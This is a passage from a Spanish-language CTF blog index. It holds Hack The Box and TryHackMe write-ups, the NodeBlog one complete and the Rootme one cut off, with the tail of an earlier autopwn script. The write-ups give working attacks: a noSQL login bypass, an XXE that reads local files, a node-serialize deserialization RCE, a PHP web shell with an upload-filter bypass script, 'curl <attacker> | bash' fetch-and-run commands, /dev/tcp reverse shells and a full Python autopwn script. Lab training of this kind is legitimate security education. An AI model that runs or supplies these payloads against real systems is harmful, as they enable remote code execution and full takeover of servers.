s.post(nunIP,data=post_data,verify=False)def http_server():    try:        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:            so.bind(('localhost', 80))            http_server = subprocess.Popen([\"python3\", \"-m\", \"http.server\", \"80\"])    except OSError:            print(\"\\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor\")if __name__ == '__main__':    print(\"[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts.\")    html_payload()    sleep(2)       http_server()    threading.Thread(target=ssti, args=()).start()    shell = listen(1234,timeout=20).wait_for_connection()    shell.interactive()¡Listo! Terminamos la automatización de la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "NodeBlog HTB Write-up",
    "url": "/posts/NodeBlog/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Web, noSQLi, XXE, Deserialized attack, Mongo, Autopwn, Linux, Easy",
    "date": "2023-02-11 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada NodeBlog, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Injección noS...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada NodeBlog, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Injección noSQL.  XXE para leer archivos internos de la máquina.  Ataque de desserialización en Node.js.  Enumeración en MongoDB.  Automatización de la intrusión en Python.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.139PING 10.10.11.139 (10.10.11.139) 56(84) bytes of data.64 bytes from 10.10.11.139: icmp_seq=1 ttl=63 time=141 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap --open -sS -p- -min-rate 5000 -n -Pn 10.10.11.139 -oG portsAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT     STATE SERVICE22/tcp   open  ssh5000/tcp open  upnpRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p22,5000 10.10.11.139 -oN ServiceScanComo resultado del escaneo tenemos:22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)|_  256 2221e9f485908745161f733641ee3b32 (ED25519)5000/tcp open  http    Node.js (Express middleware)|_http-title: BlogService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelObservamos que se tiene el puerto 5000 con un servicio http, por lo tanto, utilizamos whatweb para enumerar información:whatweb 10.10.11.139:5000http://10.10.11.139:5000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.139], Script[JavaScript], Title[Blog], X-Powered-By[Express], X-UA-Compatible[IE=edge]Entramos a la web para ver que tenemos:Observamos una especie de blog que tiene solo una entrada, si la vemos:Pero no tenemos nada interesante.Si volvemos tenemos un panel de login, asiq ue vamos a ingresar:Vamos a dar credenciales en forma de prueba:Como resultado tenemos:Contraseña equivocada, esto quiere decir que tal vez podamos enumerar usuarios del sistema, si ingresamos otro nombre:Tenemos como resultado:Usuario no válido. Por lo tanto, el usuario admin si existe.Vamos a utilizar brupsuite para analizar la petición:Obsevamos que se tramita por post el usuario y contraseña como esperaríamos.Vamos a intentar una injección básica de sql, pero en este caso está en url encode:user=admin'+or+'1'%3d'1--+-&amp;password=passwordPero nos dice usuario no válido.Podemos probar si el sistema se demora en responder 5 segundos:user=admin&amp;password=password'+or+sleep(5)Pero no pasa nada.Cambiamos el método a aplication/json e intentamos de nuevo:{\"user\":\"admin' or 1=1-- -\",\"password\": \"password\"}Pero tampoco pasa nada.Quiźas no es vulnerable a SQLi, sin embargo, podríamos probar si es vulnerable a noSQLi. Podría ser que se esté aplicando un mongo, cassandra o alguna base de datos no relacional.Si buscamos por la web encontramos en github varios playloads para probar. Debemos probar varias, en este caso estamos utilizando json así que utilizaremos este:{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}Como sabemos que el nombre de usuario válido es admin lo cambiaremos:{\"user\": \"admin\", \"password\": {\"$ne\": \"zapato\"}}el “$ne” corresponde al not equal, por lo tanto, le estamos diciendo soy el usuario admin y mi contraseña no es zapato. Veamos que sucede:Ha funcionado, estamos logeados dentro de la página. Por lo tanto, si era vulnerable a noSQLi.Observamos que tenemos una nueva área para subir cosas, si le hacemos click nos pedirá subir un archivo, vamos a subir un archivo de prueba para ver qué ocurre:Invalid XML Example: Example DescriptionExample MarkdownTal parece que es necesario subir un archivo XML. Vamos a crear un archivo XML normal para ver que hace la página:Invalid XML Example: &lt;post&gt;&lt;title&gt;Example Post&lt;/title&gt;&lt;description&gt;Example Description&lt;/description&gt;&lt;markdown&gt;Example Markdown&lt;/markdown&gt;&lt;/post&gt;Vamos a recrearlo:&lt;post&gt;&lt;title&gt;archivo xml&lt;/title&gt;&lt;description&gt;Description&lt;/description&gt;&lt;markdown&gt; Markdown&lt;/markdown&gt;&lt;/post&gt;Lo subimos a la web para ver que ocurre:ExplotaciónVemos que ha parseado la información que hemos puesto en el archivo XML. Esto es peligroso porque puede acontecer un XXE que es una inyección de entidad externa XML. Buscamos en la web como explotar dicha vulnerabilidad, en la página de github de Payloads all the things tenemos bastantes para jugar.Si encontramos a la sección de XXE, encontramos lo siguiente:&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;  &lt;!DOCTYPE foo [    &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;Vamos a agregarlo a nuestro xml:&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;  &lt;!DOCTYPE foo [    &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;post&gt;&lt;title&gt;archivo xml&lt;/title&gt;&lt;description&gt;Description&lt;/description&gt;&lt;markdown&gt; &amp;xxe;&lt;/markdown&gt;&lt;/post&gt;En la sección de markdown agregamos &amp;xxe; para llamar la entidad y hacer que se acontezca el XXE, si subimos el archivo observamos:Observamos que se ha ejecutado correctamente el comando, por lo tanto, explotamos el XXE, ahora lo utilizaremos para revisar diversas rutas e información del sistema, en la captura de nmap observamos que está el servidor de node.js normalmente en este tipo de proyectos hay diferentes archivos, uno en especial podríamos ver el llamado server.js, que quiźas podría contener información que nos ayude, sin embargo, no conocemos las rutas del sistema, pero como tenemos una injección noSQL podemos provocar un error y así ver si nos ofrece información de los directorios:{\"user\": \"admin\", \"password\": {^^^\"asdasd$ne\": \"zapato\"}}aAl ingresar este json con error podemos observar lo siguiente:SyntaxError: Unexpected token ^ in JSON at position 31&lt;br&gt; &amp;nbsp; &amp;nbsp;at JSON.parse (&amp;lt;anonymous&amp;gt;)&lt;br&gt; &amp;nbsp; &amp;nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)&lt;Observamos una dirección /opt/blog en donde se encuentra el node_modules, por lo tanto, ahi debe estar el servidor web js. En el XXE vamos a introducir la dirección /opt/blog/server.js, como resultado tenemos:Tenemos el siguiente código en js:const express = require('express')const mongoose = require('mongoose')const Article = require('./models/article')const articleRouter = require('./routes/articles')const loginRouter = require('./routes/login')const serialize = require('node-serialize')const methodOverride = require('method-override')const fileUpload = require('express-fileupload')const cookieParser = require('cookie-parser');const crypto = require('crypto')const cookie_secret = \"UHC-SecretCookie\"//var session = require('express-session');const app = express()mongoose.connect('mongodb://localhost/blog')app.set('view engine', 'ejs')app.use(express.urlencoded({ extended: false }))app.use(methodOverride('_method'))app.use(fileUpload())app.use(express.json());app.use(cookieParser());//app.use(session({secret: \"UHC-SecretKey-123\"}));function authenticated(c) {    if (typeof c == 'undefined')        return false    c = serialize.unserialize(c)    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){        return true    } else {        return false    }}app.get('/', async (req, res) =&gt; {    const articles = await Article.find().sort({        createdAt: 'desc'    })    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })})app.use('/articles', articleRouter)app.use('/login', loginRouter)app.listen(5000)Si analizamos un poco el codigo, observamos que utiliza esta librería:const serialize = require('node-serialize')Y está esta función:function authenticated(c) {    if (typeof c == 'undefined')        return false    c = serialize.unserialize(c)    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){        return true    } else {        return false    }}Que recibe un parámetro c del usuario, la cual después compara con el resultado de la función hash para autenticar el usuario. Por lo tanto, está comparando las cookies para iniciar la sesión desserializando la data que le llega desde el usuario. Esto abre la posibilidad del ataque de desserialización, pues lo que podemos hacer es mandarle una data maliciosa que se va a serializar y mandar al servidor web, cuando este llegue va a ser desserializado, sin embargo, antes de que lo haga haremos que ejecute la acción que les estamos diciendo o el comando que mandamos de manera maliciosa a través de un bug en nodejs (IIFE).Si buscamos en la web tenemos esta web que nos dice la forma de enviar data serializada para injectar comandos, especificamente es esta:{\"rce\":\"_$$ND_FUNC$$_function (){require(\\'child_process\\').exec(\\'ls /\\', function(error, stdout, stderr) { console.log(stdout) });}()\"}Sin embargo el que enviaremos será este:{\"rce\":\"_$$ND_FUNC$$_function (){ require('child_process').exec('curl 10.10.14.17', function(error, stdout, stderr) { console.log(stdout) });}()\"}Enviando una petición http hacia nuestro equipo, vamos a tener abierto un servidor http con python para aquello. Hay que tener encuenta que la data viaja en url enconde, por lo tanto, vamos a aplicarselo a nuestra data:%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%63%75%72%6c%20%31%30%2e%31%30%2e%31%34%2e%31%37%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7dDentro del navegador web ponemos nuestra cookie y recargamos:Luego de recargar la página, observamos el servidor http:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.139 - - [13/Feb/2023 17:31:02] \"GET / HTTP/1.1\" 200 -Tenemos una petición get del servidor web. Ahora el siguiente paso es ganar acceso a la máquina, en este caso haremos la misma petición get pero tendremos un recurso llamado index.html que contendrá lo siguiente:#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.17/1235 0&gt;&amp;1Luego, esa información que obtenga de la petición, haremos que la ejecute con bash mientras esperamos una conexión con netcat por el puerto 1235:{\"rce\":\"_$$ND_FUNC$$_function (){ require('child_process').exec('curl 10.10.14.17 | bash', function(error, stdout, stderr) { console.log(stdout) });}()\"} python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.139 - - [13/Feb/2023 17:36:48] \"GET / HTTP/1.1\" 200 -Y si vemos el netcat:nc -nvlp 1235listening on [any] 1235 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.139] 54948bash: cannot set terminal process group (863): Inappropriate ioctl for devicebash: no job control in this shellTo run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.bash: /home/admin/.bashrc: Permission deniedadmin@nodeblog:/opt/blog$ whoamiwhoamiadminEntramos a la máquina como usuario admin.Si intentamos entrar al directorio de admin nos dice lo siguiente:admin@nodeblog:/home$ cd admincd adminbash: cd: admin: Permission deniedadmin@nodeblog:/home$ ls -lals -latotal 16drwxr-xr-x 1 root  root   10 Dec 27  2021 .drwxr-xr-x 1 root  root  180 Dec 27  2021 ..drw-r--r-- 1 admin admin 220 Jan  3  2022 adminNo tenemos permisos de atravesar esa carpeta, sin embargo, somos el dueño asi que lo cambiaremos con chmod:admin@nodeblog:/home$ chmod u+x adminchmod u+x adminadmin@nodeblog:/home$ cd admincd adminDentro del directorio buscamos la flag:admin@nodeblog:~$ cat user.txtcat user.txt14f76e48c30e6a58a819a1¡Bien!, tenemos la flag de usuario.Si intentamos entrar a root:admin@nodeblog:~$ cd /root/cd /root/bash: cd: /root/: Permission deniedAsi que tendremos que escalar.Escalada de privilegiosNecesitamos una consola decente asi que se ejecutan los siguientes comandos:  script /dev/null -c bash  (ctrl + z)  stty raw -echo; fg  reset xterm  export TERM=xterm  export SHELL=bashDe esta forma tenemos una consolta totalmente funcional.Intentamos ver los privilegios que tenemos:admin@nodeblog:~$ sudo -l[sudo] password for admin: Pero no tenemos la contraseña.Si listamos tareas cron no encontramos nada interesante:admin@nodeblog:~$ cat /cron/tabcat: /cron/tab: No such file or directoryadmin@nodeblog:~/.ssh$ cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )#Si buscamos permisos SUID:admin@nodeblog:~$ find \\-perm -4000 2&gt;/dev/nullTampoco encontramos nada.Si buscamos por los servicios que se están ejecutando en la máquina:dmin@nodeblog:~$ netstat -natActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State      tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     tcp        0    138 10.10.11.139:54948      10.10.14.17:1235        ESTABLISHEDtcp        0      0 127.0.0.1:27017         127.0.0.1:59240         ESTABLISHEDtcp        0      0 127.0.0.1:27017         127.0.0.1:59244         ESTABLISHEDtcp        0      0 127.0.0.1:27017         127.0.0.1:59242         ESTABLISHEDtcp        0      0 127.0.0.1:59240         127.0.0.1:27017         ESTABLISHEDtcp        0      0 127.0.0.1:59244         127.0.0.1:27017         ESTABLISHEDtcp        0      0 127.0.0.1:59242         127.0.0.1:27017         ESTABLISHEDtcp6       0      0 :::5000                 :::*                    LISTEN     tcp6       0      0 :::22                   :::*                    LISTEN Si nos fijamos bien está el puerto 27017, si recordamos hicimos una injección noSQL, y este puerto normalmente se utiliza para Mongo, vamos a husmear por las bases de datos a ver si encontramos algo.admin@nodeblog:~$ mongoMongoDB shell version v3.6.8connecting to: mongodb://127.0.0.1:27017Implicit session: session { \"id\" : UUID(\"5846f80d-3e2b-4daf-91aa-b605bd155d54\") }MongoDB server version: 3.6.8Server has startup warnings: 2023-02-13T12:05:01.400+0000 I CONTROL  [initandlisten] 2023-02-13T12:05:01.400+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.2023-02-13T12:05:01.400+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.2023-02-13T12:05:01.400+0000 I CONTROL  [initandlisten] Utilizamos el comando help para ver los diferentes comandos que podemos utilizar, en este caso usaremos show dbs:show dbsadmin   0.000GBblog    0.000GBconfig  0.000GBlocal   0.000GBBuscaremos en admin:use adminswitched to db adminshow collectionssystem.sessionsPero no encontramos nada.Usamos blog: use blogswitched to db blog show collectionsarticlesusersEncontramos users, asi que buscaremos si hay información allí.db.users.find(){ \"_id\" : ObjectId(\"61b7380ae5814df6030d2373\"), \"createdAt\" : ISODate(\"2021-12-13T12:09:46.009Z\"), \"username\" : \"admin\", \"password\" : \"IppsecSaysPleaseSubscribe\", \"__v\" : 0 }Encontramos lo que parece ser la contraseña del usuario admin, vamos a probarla:admin@nodeblog:~$ sudo -l[sudo] password for admin: Matching Defaults entries for admin on nodeblog:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser admin may run the following commands on nodeblog:    (ALL) ALL    (ALL : ALL) ALLSi corresponde a su contraseña, podemos ver que podemos utilizar cualquier comando como root, somos sudoes así que estamos listos:admin@nodeblog:~$ sudo bashroot@nodeblog:/home/admin# whoamirootroot@nodeblog:/home/admin# cd /rootroot@nodeblog:~# cat root.txtdacc9bd5f9edbacb1c4fd9broot@nodeblog:~# ¡Bien!Hemos ganado acceso como administrador.Como un extra vamos a realizar la automatización de la intrusión a la máquina.Vamos a utilizar las siguientes librerías:import requests,sys,base64from pwn import *from os import systemDefinimos nuestras variables:Host_ip = sys.argv[1]Target_ip = 'http://10.10.11.139:5000's = requests.Session()Luego, tenemos la siguiente función que se encarga de hacer un url encode completo al string:def encode_all(string):    return \"\".join(\"%{0:0&gt;2}\".format(format(ord(char), \"x\")) for char in string)La siguiente función, es esta:def unserialize_attack():    reverse = f'bash -i &gt;&amp; /dev/tcp/{Host_ip}/1234 0&gt;&amp;1'    reverse_bytes = reverse.encode(\"ascii\")    base64_bytes = base64.b64encode(reverse_bytes)    reversebase64 = base64_bytes.decode(\"ascii\")    payload= encode_all(\"\"\"{\"rce\":\"_$$ND_FUNC$$_function (){ require('child_process').exec('echo %s| base64 -d | bash', function(error, stdout, stderr) { console.log(stdout) });}()\"}\"\"\" % reversebase64)    cookie = f'auth ={payload}'     headers = {    \"Cookie\": cookie    }       r = s.get(Target_ip,headers=headers)La cual pasa a base64 la reverse shell y lo agrega al payload, el cual pasa a url enconde. Toda la data se envía en el header en la petición get.Finalmente, en el main:    threading.Thread(target=unserialize_attack, args=()).start()    shell = listen(1234,timeout=10).wait_for_connection()    shell.interactive()Tenemos la llamada a la función unserialize_attack mientras estamos escuchando por el puerto 1234 la conexión.El código completo es el siguiente:import requests,sys,base64from pwn import *from os import systemdef def_handler(sig, frame):    print(\"\\n\\n[!] saliendo...\\n\")    sys.exit(1)signal.signal(signal.SIGINT, def_handler)if len(sys.argv) &lt; 2:    print(f'[!] Uso: python3 {sys.argv[0]} \"Tu IP\"\\n' )    sys.exit(1)Host_ip = sys.argv[1]Target_ip = 'http://10.10.11.139:5000's = requests.Session()def encode_all(string):    return \"\".join(\"%{0:0&gt;2}\".format(format(ord(char), \"x\")) for char in string)def unserialize_attack():    reverse = f'bash -i &gt;&amp; /dev/tcp/{Host_ip}/1234 0&gt;&amp;1'    reverse_bytes = reverse.encode(\"ascii\")    base64_bytes = base64.b64encode(reverse_bytes)    reversebase64 = base64_bytes.decode(\"ascii\")    payload= encode_all(\"\"\"{\"rce\":\"_$$ND_FUNC$$_function (){ require('child_process').exec('echo %s| base64 -d | bash', function(error, stdout, stderr) { console.log(stdout) });}()\"}\"\"\" % reversebase64)    cookie = f'auth ={payload}'     headers = {    \"Cookie\": cookie    }       r = s.get(Target_ip,headers=headers)if __name__ == '__main__':        threading.Thread(target=unserialize_attack, args=()).start()    shell = listen(1234,timeout=10).wait_for_connection()    shell.interactive()Si lo ejecutamos:python3 AutopwnNodeBlog.py 10.10.14.17[+] Trying to bind to :: on port 1234: Done[+] Waiting for connections on :::1234: Got connection from ::ffff:10.10.11.139 on port 59108[*] Switching to interactive modebash: cannot set terminal process group (863): Inappropriate ioctl for devicebash: no job control in this shelladmin@nodeblog:/opt/blog$ $ whoamiwhoamiadmin ¡Listo! Hemos automatizado la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Rootme TryHackMe Write-up",
    "url": "/posts/Root_me/",
    "categories": "Write up, TryHackMe",
    "tags": "Enumeration, Web, Arbitrary file upload, SUDO, Python, SUID, Autopwn, Scripting, Fuzzing, Linux, Easy",
    "date": "2023-02-10 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de TryHackMe llamada Rootme, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del si...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de TryHackMe llamada Rootme, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema.  Fuzzing de directorios web.  Arbitrary file upload Bypass (extesion).  Abuso de permisos SUID.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.136.211PING 10.10.136.211 (10.10.136.211) 56(84) bytes of data.64 bytes from 10.10.136.211: icmp_seq=1 ttl=63 time=221 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap en búsqueda de puertos abiertos, en este caso utilizando parámetros como -sS y –min-rate para acelerar el proceso, pues estamos en un CTF:sudo nmap -p- -sS --open --min-rate 5000 10.10.136.211 -oG portScanAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p22,80 10.10.136.211 -oN services Como resultado del escaneo tenemos:PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-title: HackIT - Home|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTenemos un servicio http, si intentamos buscar por vulnerabilidades asociadas a las versiones de los servicios utilizados en la máquina, no encontraremos nada, por lo tanto, utilizando la herramienta whatweb vamos a enumerar información del sitio web que nos puede ser de utilidad:whatweb 10.10.136.211       http://10.10.136.211 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.136.211], Script, Title[HackIT - Home]Vamos a ingresar a la web para ver que encontramos:Vemos la página principal, sin embargo, no hay mucho que hacer con respecto al análisis de parte de la web, pues no podemos realizar ninguna interacción con la misma. Echemosle un ojo al código fuente por si encontramos algo especial:Pero no encontramos nada de utilidad.En este punto, vamos a intentar descubrir nuevos directorios de la página, esto lo realizaremos utilizando la herramienta wfuzz:wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.136.211/FUZZComo estamos ante una máquina CTF, utilizaremos 200 hilos para realizar el fuzzing, no tenemos que preocuparnos por bloqueos o saturación del servidor web. Vamos a ver que directorios ha encontrado:000000550:   301        9 L      28 W       312 Ch      \"css\"                                                                                             000000953:   301        9 L      28 W       311 Ch      \"js\"                                                                                              000005520:   301        9 L      28 W       314 Ch      \"panel\"                                                                                           000007771:   301        9 L      28 W       316 Ch      \"Website\"                                                                                         000000164:   301        9 L      28 W       316 Ch      \"uploads\"Vemos un par de directorios que llaman la atención, llamados panel  y uploads, vamos a revisar que son:Al ingresar al directorio panel, nos encontramos con la posibilidad de subir un archivo, como vemos que utiliza PHPSESSID sabemos que estamos ante una web en php, podríamos subir un archivo php malicioso, el cual nos permita como atacantes poder ejecutar comandos en el sistema, en este caso en servidor web. Sin embargo, no sabemos aún que tipo de archivos podemos subir, ni tampoco donde se están almacenando.Si vamos atrás un poco, vemos que tenemos otro directorio llamado uploads, esto nos hace pensar que probablemente allí se almacenen archivos que se suban a la web, vamos a ver este directorio:Vemos que no existe ningún archivo en este momento, vamos a intentar subir un archivo de prueba a la web para ver si se almacena en este directorio.Para ello crearemos un archivo .txt con un mensaje y lo cargamos en la web:Cargamos el archivo testing.txt y le damos en upload:Al parecer el archivo ha sido subido exitosamente, vamos a revisar el directorio uploads para ver si allí se encuentra el testing.txt:Vemos que está nuestro archivo, vamos a abrirlo:Es exitoso, por lo tanto, vamos a intentar subir un archivo php malicioso:Explotación&lt;?php      echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']). \"&lt;/pre&gt;\" ;?&gt;Este pequeño archivo php nos ayudará mediante la función shell_exec ejecutar comandos en el servidor web, todo esto a través de una variable llamada “cmd”, la cual se recibe como parámetro en la url. Vamos a llamar a este archivo reverse.php y lo intentaremos subir al servidor web:Le damos a upload:Vemos que no le ha gustado para nada, nos dice que las extensiones php no están permitidas. Vamos a intentar burlar esta medida de seguridad, todo pensando que el servidor web simplemente está verificando si las extensiones son seguras o no. Para ello, vamos a ir a la web de HackTricks, y vamos a ver todas las posibles extensiones alternativas que podemos utilizar para nuestro archivo php malicioso, son bastantes, intentemos automatizar este proceso.En primer lugar, vamos a entender como se tramita la data, para ello vamos a utilizar Burpsuite, si interceptamos la petición:Vemos que hay 2 parámetros, el primero que contiene el payload y otro tiene la data Upload, si vemos a la derecha:Esto nos hace pensar que necesitamos tanto el file que se está subiendo, como una data llamada submit, que vale Upload, para ello vamos a construir el siguiente script en python, que utilizando la libraría request subirá los archivos a la web:import requestsurl = \"http://10.10.22.79/panel/\" # Change victim IPextensions= [\".php\", \".php2\", \".php3\", \".php4\", \".php5\", \".php6\", \".php7\", \".phps\", \".phps\", \".pht\", \".phtm\", \".phtml\", \".pgif\", \".shtml\", \".htaccess\", \".phar\", \".inc\", \".hphp\", \".ctp\", \".module\"]s = requests.Session()def File_Upload():    for ext in extensions:        payload = \"\"\"  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt; \"\"\"         data = {            'submit' : \"Upload\"        }                files  = {'fileUpload':(f'shell{ext}',payload),                             }        r = s.post(url,files=files,data=data)if __name__ == '__main__':    File_Upload()Si ejectuamos el código, y vamos a la sección de uploads, encontraremos lo siguiente:Vemos que muchos archivos han pasado el filtro de la extensión, vamos a ir revisando uno por uno para ver que encontramos:Por ejemplo, vemos que este ha fallado, pues el servidor no está interpretando el código php, en caso de que estuviese interpretandolo, deberíamos ver la página en blanco, si revisando uno por uno, vamos a encontrar solo 2 extensiones que presentan una página en blanco, tenemos .phar y .phtlm, vamos a utilizar el .phar e intentemos enviar un comando utilizando la variable cmd que definimos en el archivo .php:Vemos que el comando id se ha ejecutado correctamente y somos el usuario www-data, vamos a intentar que el servidor nos envíe en una conexión hacia nuestra máquina para ganar acceso al sistema.Esto consta de 3 partes, en primer lugar tenemos el archivo que queremos que el servidor ejecute para que nos mande un conexión reversa hacia nuestra máquina:!#/bin/bashbash -i &gt;&amp; /dev/tcp/10.18.87.177/1234 0&gt;&amp;1Este es un pequeño script de bash, que utilizando el /dev/tcp, envía una bash interactiva hacia el ip y el puerto especificado en el script. Para que la máquina víctima pueda ejecutar esto, vamos a compartirlo a través de un servidor http con python, de la siguiente manera:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...Este servidor http, estará corriendo en la misma carpeta donde tenemos nuestro archivo bash, le pondremos el nombre de index.html, debido a que si se le realiza una petición http a algún servidor, por defecto va a apuntar al archivo index.html, no importa que no sea un archivo html, lo que nos interesa es que la máquina víctima tenga acceso a este recurso.Lo último corresponde a nuestro listener, el cual será netcat, estaremos escuchando cualquier conexión entrante para el puerto 1234:nc -nvlp 1234listening on [any] 1234 ...Con todo lo anterior listo en nuestro equipo de atacante, vamos a proceder a realizar la petición http desde el servidor web, al momento que la máquina obtenga el index.html, haremos que ese output, es decir, la conexión bash interactiva hacia nuestra máquina, sea interpretada con bash, para que la máquina víctima ejecute esa instrucción y ganemos acceso:http://10.10.22.79/uploads/shell.phar?cmd=curl 10.18.87.177 | bashAl darle al enter, vamos a ver que ha llegado una petición a nuestro servidor http:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.22.79 - - [18/Mar/2023 17:16:39] \"GET / HTTP/1.1\" 200 -Por lo tanto, si vemos nuestro netcat:nc -nvlp 1234listening on [any] 1234 ...connect to [10.18.87.177] from (UNKNOWN) [10.10.22.79] 51626bash: cannot set terminal process group (897): Inappropriate ioctl for devicebash: no job control in this shellwww-data@rootme:/var/www/html/uploads$ whoamiwhoamiwww-dataBien, hemos ganado acceso a la máquina.De paso, encontramos la flag y somos capaces de leerla:www-data@rootme:/var/www$ cat user.txtcat user.txtTHM{*******}Escalada de privilegiosEl primer paso será arreglar la terminal, para ello vamos a ejecutar los siguiente comandos:  script /dev/null -c bash  control + z  stty ray -echo; fg  reset xterm  export TERM=xterm  export SHELL=bash  stty rows X columns Y (dependiendo de tu stty size)De esta forma obtenemos una stty más cómoda.Si buscamos dentro del directorio web no vamos a encontrar nada interesante, no existen bases de datos ni nada por el estilo, por 